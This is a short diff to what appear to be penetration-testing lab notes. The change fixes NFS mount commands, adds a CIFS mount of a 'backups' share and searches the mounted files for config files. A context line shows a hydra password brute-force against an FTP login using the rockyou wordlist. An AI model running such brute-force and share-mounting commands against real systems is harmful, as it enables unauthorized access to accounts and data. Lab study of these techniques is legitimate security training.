@@ -92,8 +92,9 @@ hydra -l steph -P $rockyou 192.168.200.5 ftp
 NFS
 
 showmount -e 192.168.200.5
-mkdir /tmp/bu 
-su mount -t nfs 192.168.200.5/backups /tmp/bu 
+sudo mkdir /tmp/bu 
+sudo mount -t nfs 192.168.200.5/backups /tmp/bu 
+sudo mount -t cifs "//192.168.200.5/backups" /mnt/bu
 cd /tmp/bu 
 find | tee ~/lab/nfslist.txt 
 find | grep -i config 
